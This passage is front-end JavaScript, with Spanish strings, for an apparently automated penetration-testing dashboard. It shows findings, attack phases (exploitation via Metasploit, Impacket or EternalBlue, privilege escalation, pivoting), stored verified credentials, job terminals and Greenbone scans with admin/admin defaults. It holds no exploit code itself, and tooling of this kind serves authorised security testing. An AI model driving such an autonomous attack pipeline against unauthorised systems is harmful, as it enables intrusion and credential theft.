    const SEV_ICON  = {critical:'fa-skull-crossbones', high:'fa-triangle-exclamation', medium:'fa-circle-exclamation', low:'fa-info-circle', info:'fa-info'};
    const sorted = [...findings].sort((a,b) => {
        const o = {critical:0, high:1, medium:2, low:3, info:4};
        return (o[a.severity]??5) - (o[b.severity]??5);
    });
    el.innerHTML = sorted.slice(0, 30).map(f => `
        <div class="ap-finding-row" style="border-left:3px solid ${SEV_COLOR[f.severity]||'#8b949e'}">
            <span class="ap-finding-sev" style="color:${SEV_COLOR[f.severity]||'#8b949e'}">
                <i class="fas ${SEV_ICON[f.severity]||'fa-circle'}"></i>
                ${f.severity?.toUpperCase()||'?'}
            </span>
            <span class="ap-finding-title" title="${h(f.description||'')}">
                ${h(f.title||'—')}
            </span>
            ${f.cve ? `<span class="badge bg-dark text-muted ms-auto" style="font-size:9px">${h(f.cve)}</span>` : ''}
        </div>`).join('');
    if (sorted.length === 0) el.innerHTML = '<div class="text-muted small p-2">Sin hallazgos aún...</div>';
}

function _apUpdatePhase(logLines) {
    const phases = {
        'osint':   ['OSINT'],
        'scan':    ['SCAN', 'PORTS'],
        'enum':    ['EXEC', 'QUEUE'],
        'exploit': ['EXPLOIT', 'REACT', 'IMPACKET', 'MSF', 'ETERNALBLUE'],
        'post':    ['POSTEXPLOIT', 'PRIVESC', 'PIVOT', 'FLAG', 'ROOT'],
    };
    const phaseIds = {osint:'ph-osint', scan:'ph-scan', enum:'ph-enum', exploit:'ph-exploit', post:'ph-post'};
    const allPhases = ['osint','scan','enum','exploit','post'];

    // Determine highest phase seen in logs
    let maxPhase = -1;
    for (const line of logLines) {
        const tag = (line.split('] ')[1]||'').split(' ')[0].toUpperCase();
        allPhases.forEach((ph, i) => {
            if (phases[ph].some(p => tag.startsWith(p)) && i > maxPhase) maxPhase = i;
        });
    }

    allPhases.forEach((ph, i) => {
        const el = document.getElementById(phaseIds[ph]);
        if (!el) return;
        if (i < maxPhase) { el.className = 'ap-phase-step done'; }
        else if (i === maxPhase) { el.className = 'ap-phase-step active'; }
        else { el.className = 'ap-phase-step'; }
    });

    // Show last action
    const last = logLines[logLines.length - 1] || '';
    const actionEl = document.getElementById('ap-current-action');
    if (actionEl && last) {
        const short = last.replace(/^\[\d+:\d+:\d+\]\s+/, '').substring(0, 60);
        actionEl.textContent = short;
    }
}

function _setText(id, val) {
    const el = document.getElementById(id);
    if (el) el.textContent = val;
}

// ── Gantt Chart ────────────────────────────────────────────────────────────

function _apUpdateGantt(timeline) {
    const ctx = document.getElementById('ap-gantt-chart');
    if (!ctx) return;

    // Take last 15 jobs for readability
    const items = timeline.slice(-15);
    const labels = items.map(t => `[${t.target}] ${t.name}`.substring(0, 35));
    const colors = items.map(t =>
        t.status === 'completed' ? 'rgba(63,185,80,0.7)' :
        t.status === 'error'     ? 'rgba(248,81,73,0.7)' :
        'rgba(88,166,255,0.7)'
    );

    const minStart = items.reduce((acc, t) => Math.min(acc, new Date(t.start).getTime()), Infinity);
    const starts = items.map(t => new Date(t.start).getTime() - minStart);
    const durations = items.map(t => Math.max(500, new Date(t.end).getTime() - new Date(t.start).getTime()));

    if (AP.ganttChart) {
        AP.ganttChart.data.labels = labels;
        AP.ganttChart.data.datasets[0].data = starts.map((s, i) => [s, s + durations[i]]);
        AP.ganttChart.data.datasets[0].backgroundColor = colors;
        AP.ganttChart.update('none');
        return;
    }

    AP.ganttChart = new Chart(ctx, {
        type: 'bar',
        data: {
            labels,
            datasets: [{
                label: 'Duración (ms)',
                data: starts.map((s, i) => [s, s + durations[i]]),
                backgroundColor: colors,
                borderRadius: 3,
                borderSkipped: false,
            }],
        },
        options: {
            indexAxis: 'y',
            animation: false,
            responsive: true,
            maintainAspectRatio: false,
            plugins: { legend: { display: false }, tooltip: {
                callbacks: {
                    label: (ctx) => {
                        const dur = Math.round((ctx.raw[1] - ctx.raw[0]) / 1000);
                        return `${dur}s`;
                    }
                }
            }},
            scales: {
                x: { ticks: { color: '#8b949e', font: { size: 9 } }, grid: { color: 'rgba(139,148,158,0.1)' } },
                y: { ticks: { color: '#8b949e', font: { size: 9 } }, grid: { display: false } },
            },
        },
    });
}

// ── Risk Heatmap ────────────────────────────────────────────────────────────

function _apUpdateHeatmap(heatmap) {
    const el = document.getElementById('ap-heatmap');
    if (!el) return;
    if (!Object.keys(heatmap).length) {
        el.innerHTML = '<span class="text-muted" style="font-size:11px">Sin datos aún...</span>';
        return;
    }
    el.innerHTML = Object.entries(heatmap).map(([target, services]) => {
        const cells = Object.entries(services).map(([svc, risk]) =>
            `<span class="ap-hm-cell risk-${risk}" title="${h(svc)} — riesgo ${risk}">${h(svc)}</span>`
        ).join('');
        return `<div class="ap-heatmap-row">
            <span class="ap-heatmap-label">${h(target)}</span>
            <div class="ap-heatmap-cells">${cells}</div>
        </div>`;
    }).join('');
}

// ── Job List ───────────────────────────────────────────────────────────────

function _apUpdateJobList(data) {
    const el = document.getElementById('ap-job-list');
    if (!el) return;
    const hasActivity = (data.completed_jobs || 0) > 0 || data.running;
    if (!hasActivity) {
        el.innerHTML = '<span class="text-muted" style="font-size:11px">Sin jobs aún</span>';
        return;
    }

    fetch(`/api/jobs?project_id=${state.activeProject.id}`).then(r => r.json()).then(jobs => {
        const apJobs = jobs.filter(j => j.tool?.startsWith('[AP]')).slice(0, 30);
        if (!apJobs.length) {
            el.innerHTML = '<span class="text-muted" style="font-size:11px">Sin jobs del autopiloto aún</span>';
            return;
        }
        const statusIcon = { running: '🟡', completed: '🟢', error: '🔴', stopped: '⚫' };
        el.innerHTML = apJobs.map(j => `
            <div class="ap-job-row" onclick="apViewJob('${j.id}')">
                <span class="ajr-status">${statusIcon[j.status] || '⚫'}</span>
                <span class="ajr-name">${h(j.tool)}</span>
                <span class="ajr-target">${j.started_at?.substring(11, 19) || ''}</span>
            </div>`).join('');
    }).catch(() => {});
}

// ── Split Terminal ──────────────────────────────────────────────────────────

function _apInitXterms() {
    if (AP.xtermLeft) return;
    [['ap-xterm-left', 0], ['ap-xterm-right', 1]].forEach(([divId, idx]) => {
        const container = document.getElementById(divId);
        if (!container) return;
        const term = new Terminal({
            theme: { background:'#0d1117', foreground:'#c9d1d9', cursor:'#58a6ff' },
            fontSize: 10, fontFamily: 'Consolas, monospace', cursorBlink: false,
            disableStdin: true, scrollback: 1000,
        });
        const fitAddon = new FitAddon.FitAddon();
        term.loadAddon(fitAddon);
        term.open(container);
        try { fitAddon.fit(); } catch {}
        if (idx === 0) { AP.xtermLeft = term; AP.xtermFitLeft = fitAddon; }
        else           { AP.xtermRight = term; AP.xtermFitRight = fitAddon; }
    });
}

function apViewJob(jobId) {
    apSplitLoadJob(AP.splitJobIds[0] === jobId ? 0 : (AP.splitJobIds[1] === jobId ? 1 : 0), jobId);
}

function apSplitSelectJob(paneIdx) {
    fetch(`/api/jobs?project_id=${state.activeProject?.id}`).then(r => r.json()).then(jobs => {
        const apJobs = jobs.filter(j => j.tool?.startsWith('[AP]')).slice(0, 20);
        if (!apJobs.length) { toast('Sin jobs del autopiloto aún', 'info'); return; }
        const options = apJobs.map((j, i) => `${i + 1}. [${j.status}] ${j.tool}`).join('\n');
        const choice = prompt(`Selecciona job para panel ${paneIdx + 1} (número):\n\n${options}`);
        if (!choice) return;
        const idx = parseInt(choice, 10) - 1;
        if (isNaN(idx) || idx < 0 || idx >= apJobs.length) { toast('Número inválido', 'warning'); return; }
        apSplitLoadJob(paneIdx, apJobs[idx].id);
    });
}

async function apSplitLoadJob(paneIdx, jobId) {
    const term = paneIdx === 0 ? AP.xtermLeft : AP.xtermRight;
    if (!term) return;
    AP.splitJobIds[paneIdx] = jobId;

    const res = await fetch(`/api/jobs/${jobId}`);
    const data = await res.json();
    term.reset();
    term.writeln(`\x1b[1;34m[Job: ${data.tool}]\x1b[0m`);
    (data.output || []).forEach(line => term.writeln(line));
    if (paneIdx === 0 && AP.xtermFitLeft) try { AP.xtermFitLeft.fit(); } catch {}
    if (paneIdx === 1 && AP.xtermFitRight) try { AP.xtermFitRight.fit(); } catch {}
}

// ── PDF + Memory ────────────────────────────────────────────────────────────

async function apDownloadPdf() {
    if (!state.activeProject) { toast('Sin proyecto activo', 'warning'); return; }
    toast('Generando PDF...', 'info');
    try {
        const res = await fetch(`/api/projects/${state.activeProject.id}/report/pdf`);
        if (!res.ok || !res.headers.get('Content-Type')?.includes('application/pdf')) {
            const err = await res.json().catch(() => ({}));
            toast(`Error PDF: ${err.error || res.statusText}`, 'danger'); return;
        }
        const blob = await res.blob();
        const url = URL.createObjectURL(blob);
        const a = document.createElement('a');
        a.href = url; a.download = `${state.activeProject.name}_report.pdf`;
        document.body.appendChild(a); a.click();
        document.body.removeChild(a); URL.revokeObjectURL(url);
        toast('PDF descargado', 'success');
    } catch (e) { toast(`Error: ${e.message}`, 'danger'); }
}

function apShowMemoryStats() {
    fetch('/api/memory/stats').then(r => r.json()).then(d => {
        const msg = `Memoria persistente:\n• ${d.known_hosts} hosts conocidos\n• ${d.verified_creds} credenciales verificadas\n• ${d.pivot_networks} redes pivot descubiertas`;
        alert(msg);
    }).catch(() => toast('Error consultando memoria', 'danger'));
}

// ── Cleanup ────────────────────────────────────────────────────────────────

function _apStopAll() {
    if (AP.statusPoll)   { clearInterval(AP.statusPoll); AP.statusPoll = null; }
    if (AP.timerInterval){ clearInterval(AP.timerInterval); AP.timerInterval = null; }
    if (AP.sseLog)       { AP.sseLog.close(); AP.sseLog = null; }
}

// ══════════════════════════════════════════════════════════════════════════════
// GREENBONE / OPENVAS
// ══════════════════════════════════════════════════════════════════════════════

const GB = { taskId: null, pollInterval: null };

function _gbPid() {
    return state.activeProject?.id;
}

function _gbFillTarget() {
    const el = document.getElementById('gb-target');
    if (el && !el.value && state.vars?.rhost) el.value = state.vars.rhost;
}

async function gbStart() {
    if (!state.activeProject) { toast('Selecciona un proyecto', 'error'); return; }
    _gbFillTarget();
    const socket_path = document.getElementById('gb-socket').value.trim() || '/run/gvmd/gvmd.sock';
    const gmp_user    = document.getElementById('gb-user').value.trim() || 'admin';
    const gmp_pass    = document.getElementById('gb-pass').value.trim() || 'admin';
    const target_ip   = document.getElementById('gb-target').value.trim() || state.vars?.rhost || '';
    const scan_config = document.getElementById('gb-config').value;

    if (!target_ip) { toast('Especifica el Target IP', 'error'); return; }

    const btn = document.getElementById('gb-start-btn');
    btn.disabled = true;
    btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Iniciando...';

    try {
        const r = await fetch(`/api/projects/${_gbPid()}/greenbone/scan`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ socket_path, gmp_user, gmp_pass, target_ip, scan_config }),
        });
        const d = await r.json();
        if (!r.ok) throw new Error(d.error || 'Error al iniciar scan');

        GB.taskId = d.task_id;
        toast(`Greenbone scan iniciado (task: ${d.task_id.slice(0,8)}...)`, 'success');
        document.getElementById('gb-status-row').classList.remove('d-none');
        document.getElementById('gb-guide').classList.add('d-none');
        document.getElementById('gb-results-row').classList.add('d-none');
        document.getElementById('gb-task-info').textContent = `Task ID: ${d.task_id}`;
        _gbStartPolling();
    } catch (e) {
        toast(`Greenbone error: ${e.message}`, 'danger');
    } finally {
        btn.disabled = false;
        btn.innerHTML = '<i class="fas fa-play"></i> Iniciar Scan';
    }
}

function _gbStartPolling() {
    if (GB.pollInterval) clearInterval(GB.pollInterval);
    GB.pollInterval = setInterval(async () => {
        if (!GB.taskId) { clearInterval(GB.pollInterval); return; }
        await gbCheckStatus(true);
    }, 15000);
}

async function gbCheckStatus(silent = false) {
    if (!state.activeProject) { if (!silent) toast('Selecciona un proyecto', 'error'); return; }
    const taskId = GB.taskId || (await _gbGetStoredTaskId());
    if (!taskId) { if (!silent) toast('No hay tarea activa. Inicia un scan primero.', 'warning'); return; }
    try {
        const r = await fetch(`/api/projects/${_gbPid()}/greenbone/status/${taskId}`);
        const d = await r.json();
        if (!r.ok) throw new Error(d.error || 'Error');

        const badge = document.getElementById('gb-status-badge');
        const bar   = document.getElementById('gb-progress-bar');
        const pct   = document.getElementById('gb-progress-pct');

        const colorMap = { Running: 'primary', Done: 'success', Stopped: 'secondary', Queued: 'warning', Requested: 'info' };
        badge.textContent = d.status;
        badge.className   = `badge bg-${colorMap[d.status] || 'secondary'}`;
        bar.style.width   = `${d.progress || 0}%`;
        pct.textContent   = `${d.progress || 0}%`;

        document.getElementById('gb-status-row').classList.remove('d-none');
        document.getElementById('gb-guide').classList.add('d-none');

        if (d.status === 'Done') {
            clearInterval(GB.pollInterval);
            toast('Greenbone scan completado. Puedes importar los findings.', 'success');
        }
    } catch (e) {
        if (!silent) toast(`Error estado Greenbone: ${e.message}`, 'danger');
    }
}

async function gbImport() {
    if (!state.activeProject) { toast('Selecciona un proyecto', 'error'); return; }
    const taskId = GB.taskId || (await _gbGetStoredTaskId());
    if (!taskId) { toast('No hay tarea activa.', 'warning'); return; }
    try {
        const r = await fetch(`/api/projects/${_gbPid()}/greenbone/import/${taskId}`, { method: 'POST' });
        const d = await r.json();
        if (!r.ok) throw new Error(d.error || 'Error');

        const row = document.getElementById('gb-results-row');
        document.getElementById('gb-imported-count').textContent = d.imported;
        row.classList.remove('d-none');
        toast(`${d.imported} findings importados de Greenbone`, d.imported > 0 ? 'success' : 'warning');

        // Refresh findings tab if active
        if (state.activeProject) {
            const proj = await fetch(`/api/projects/${_gbPid()}`).then(r2 => r2.json());
            state.activeProject.findings = proj.findings || [];
            if (document.querySelector('[data-phase="findings"]')?.classList.contains('active')) {
                renderFindings();
            }
        }
    } catch (e) {
        toast(`Error importando: ${e.message}`, 'danger');
    }
}

async function _gbGetStoredTaskId() {
    if (!state.activeProject) return null;
    try {
        const r = await fetch(`/api/projects/${_gbPid()}/greenbone/state`);
        const states = await r.json();
        if (Array.isArray(states) && states.length > 0) {
            GB.taskId = states[states.length - 1].task_id;
            return GB.taskId;
        }
    } catch (e) { /* ignore */ }
    return null;
}

// Auto-fill target when Autopilot tab loads
(function _gbAutoFillOnTabLoad() {
    const origLoad = window.loadAutopilot;
    if (typeof origLoad === 'function') {
        window.loadAutopilot = function(...args) {
            origLoad.apply(this, args);
            _gbFillTarget();
            _gbGetStoredTaskId();
        };
    }
})();
